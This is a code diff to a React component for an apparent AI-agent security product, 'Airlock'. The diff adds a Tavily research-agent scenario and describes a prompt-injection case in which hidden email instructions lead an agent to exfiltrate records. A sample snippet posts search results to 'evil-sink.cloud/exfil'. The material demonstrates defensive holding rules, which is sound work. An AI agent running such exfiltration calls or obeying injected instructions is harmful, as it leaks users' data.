@@ -22,8 +22,9 @@ export function FeatureGuide({
   );
   const [simulating, setSimulating] = useState<string | null>(null);
   const [simMessage, setSimMessage] = useState<{ text: string; type: 'success' | 'error' } | null>(null);
+  const [tavilyData, setTavilyData] = useState<any>(null);
 
-  async function handleSimulate(action: 'simulate_attack' | 'simulate_benign' | 'clear') {
+  async function handleSimulate(action: 'simulate_attack' | 'simulate_benign' | 'simulate_tavily' | 'clear') {
     setSimulating(action);
     setSimMessage(null);
     try {
@@ -35,9 +36,12 @@ export function FeatureGuide({
       const data = await res.json();
       if (res.ok) {
         setSimMessage({ text: data.message || 'Action executed successfully.', type: 'success' });
+        if (action === 'simulate_tavily' && data.searchData) {
+          setTavilyData(data.searchData);
+        }
         if (onSimulationRun) {
           onSimulationRun();
-        } else {
+        } else if (action !== 'simulate_tavily') {
           // Refresh page after short delay to show updated counts
           setTimeout(() => {
             window.location.reload();
@@ -297,7 +301,7 @@ export function FeatureGuide({
                 <div>
                   <h4 className="font-bold text-slate-900">Test Verification & Approvals:</h4>
                   <p className="text-slate-500 text-xs">
-                    Trigger a sample held prompt-injection attack or routine task to verify policy enforcement.
+                    Trigger a sample held prompt-injection attack, routine task, or Tavily live web research to verify policy enforcement.
                   </p>
                 </div>
                 <div className="flex flex-wrap items-center gap-2">
@@ -307,6 +311,14 @@ export function FeatureGuide({
                     className="px-3.5 py-2 bg-rose-700 hover:bg-rose-800 text-white rounded-md text-xs font-semibold transition-all shadow-xs disabled:opacity-50"
                   >
                     {simulating === 'simulate_attack' ? 'Injecting...' : 'Simulate Prompt Injection Attack'}
+                  </button>
+                  <button
+                    disabled={!!simulating}
+                    onClick={() => handleSimulate('simulate_tavily')}
+                    className="px-3.5 py-2 bg-indigo-700 hover:bg-indigo-800 text-white rounded-md text-xs font-semibold transition-all shadow-xs disabled:opacity-50 flex items-center gap-1.5"
+                  >
+                    <span>{simulating === 'simulate_tavily' ? 'Searching Tavily...' : 'Research Agent (Tavily)'}</span>
+                    <span className="text-[10px] bg-indigo-900/40 text-indigo-100 px-1 py-0.5 rounded font-mono">Tavily</span>
                   </button>
                   <button
                     disabled={!!simulating}
@@ -403,6 +415,14 @@ export function FeatureGuide({
                   </button>
                   <button
                     disabled={!!simulating}
+                    onClick={() => handleSimulate('simulate_tavily')}
+                    className="px-3.5 py-2 bg-indigo-700 hover:bg-indigo-800 text-white rounded-md text-xs font-semibold transition-all shadow-xs disabled:opacity-50 flex items-center gap-1.5"
+                  >
+                    <span>{simulating === 'simulate_tavily' ? 'Searching Tavily...' : 'Research Agent (Tavily)'}</span>
+                    <span className="text-[10px] bg-indigo-900/40 text-indigo-100 px-1 py-0.5 rounded font-mono">Tavily</span>
+                  </button>
+                  <button
+                    disabled={!!simulating}
                     onClick={() => handleSimulate('simulate_benign')}
                     className="px-3.5 py-2 bg-slate-900 hover:bg-slate-800 text-white rounded-md text-xs font-semibold transition-all shadow-xs disabled:opacity-50"
                   >
@@ -428,17 +448,17 @@ export function FeatureGuide({
                 external MCP agent client:
               </p>
 
-              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+              <div className="grid grid-cols-1 lg:grid-cols-3 gap-4">
                 <div className="p-5 bg-white border border-slate-200 rounded-lg flex flex-col gap-3 shadow-xs">
                   <div className="flex items-center justify-between">
-                    <span className="font-bold text-slate-900 text-sm">Scenario A: Prompt Injection Exfiltration</span>
+                    <span className="font-bold text-slate-900 text-sm">Scenario A: Prompt Injection</span>
                     <span className="px-2 py-0.5 rounded bg-rose-50 text-rose-800 border border-rose-200 font-mono text-[10px] font-bold">
                       HOLDS FOR REVIEW
                     </span>
                   </div>
                   <p className="text-xs text-slate-600">
                     Simulates an agent processing inbound customer support emails where an attacker hid instructions to
-                    exfiltrate database records to an external HTTP sink. Triggers deterministic Rule R2 (reads untrusted → writes external).
+                    exfiltrate database records to an external HTTP sink. Triggers deterministic Rule R1 (reads untrusted → writes external).
                   </p>
                   <pre className="p-2.5 bg-slate-900 text-slate-200 rounded text-[11px] font-mono overflow-x-auto">
 {`const emails = await tools.inbox.get_emails();
@@ -458,7 +478,7 @@ await tools.http.post({
 
                 <div className="p-5 bg-white border border-slate-200 rounded-lg flex flex-col gap-3 shadow-xs">
                   <div className="flex items-center justify-between">
-                    <span className="font-bold text-slate-900 text-sm">Scenario B: Routine Benign Processing</span>
+                    <span className="font-bold text-slate-900 text-sm">Scenario B: Routine Benign</span>
                     <span className="px-2 py-0.5 rounded bg-emerald-50 text-emerald-800 border border-emerald-200 font-mono text-[10px] font-bold">
                       IMMEDIATE ALLOW
                     </span>
@@ -477,6 +497,62 @@ return { status: "processed", count: emails.length };`}
                     className="mt-auto px-4 py-2 bg-slate-900 hover:bg-slate-800 text-white rounded-md text-xs font-semibold transition-all shadow-xs disabled:opacity-50 text-center"
                   >
                     {simulating === 'simulate_benign' ? 'Running Task...' : 'Trigger Scenario B → Allow & Log'}
+                  </button>
+                </div>
+
+                <div className="p-5 bg-white border border-slate-200 rounded-lg flex flex-col gap-3 shadow-xs">
+                  <div className="flex items-center justify-between">
+                    <span className="font-bold text-slate-900 text-sm">Scenario C: Research Agent</span>
+                    <span className="px-2 py-0.5 rounded bg-amber-50 text-amber-800 border border-amber-200 font-mono text-[10px] font-bold">
+                      HOLDS EXFILTRATION
+                    </span>
+                  </div>
+                  <div className="flex items-center gap-1.5">
+                    <span className="text-[11px] font-bold text-indigo-700 bg-indigo-50 border border-indigo-200 px-2 py-0.5 rounded-full flex items-center gap-1">
+                      <span>Powered by Tavily</span>
+                      <span className="text-[10px]">⚡</span>
+                    </span>
+                    <span className="text-[11px] text-slate-500 font-mono">tools.tavily.web_search</span>
+                  </div>
+                  <p className="text-xs text-slate-600">
+                    Executes real-time web intelligence retrieval via Tavily API. When the agent attempts to exfiltrate retrieved web intelligence to an external sink, Airlock intercepts and holds under Rule R1.
+                  </p>
+                  <pre className="p-2.5 bg-slate-900 text-slate-200 rounded text-[11px] font-mono overflow-x-auto">
+{`const intel = await tools.tavily.web_search({
+  query: "NVIDIA Nemotron LLM agent",
+  maxResults: 3
+});
+await tools.http.post({
+  url: "https://evil-sink.cloud/exfil",
+  body: { payload: intel }
+});`}
+                  </pre>
+
+                  {tavilyData && (
+                    <div className="p-2.5 bg-indigo-50/70 border border-indigo-200 rounded text-[11px] flex flex-col gap-1.5">
+                      <div className="font-bold text-indigo-950 flex items-center justify-between">
+                        <span>Live Tavily Search Results:</span>
+                        <span className="text-[10px] text-indigo-600 font-mono">200 OK</span>
+                      </div>
+                      {tavilyData.answer && (
+                        <p className="text-indigo-900 italic line-clamp-2">"{tavilyData.answer}"</p>
+                      )}
+                      <div className="text-[10px] text-indigo-700 flex flex-col gap-0.5">
+                        {tavilyData.results?.slice(0, 2).map((r: any, idx: number) => (
+                          <div key={idx} className="truncate">
+                            • <a href={r.url} target="_blank" rel="noreferrer" className="underline hover:text-indigo-900">{r.title}</a>
+                          </div>
+                        ))}
+                      </div>
+                    </div>
+                  )}
+
+                  <button
+                    disabled={!!simulating}
+                    onClick={() => handleSimulate('simulate_tavily')}
+                    className="mt-auto px-4 py-2 bg-indigo-700 hover:bg-indigo-800 text-white rounded-md text-xs font-semibold transition-all shadow-xs disabled:opacity-50 text-center flex items-center justify-center gap-1.5"
+                  >
+                    {simulating === 'simulate_tavily' ? 'Executing Tavily Query...' : 'Trigger Tavily Research → Hold Exfiltration'}
                   </button>
                 </div>
               </div>
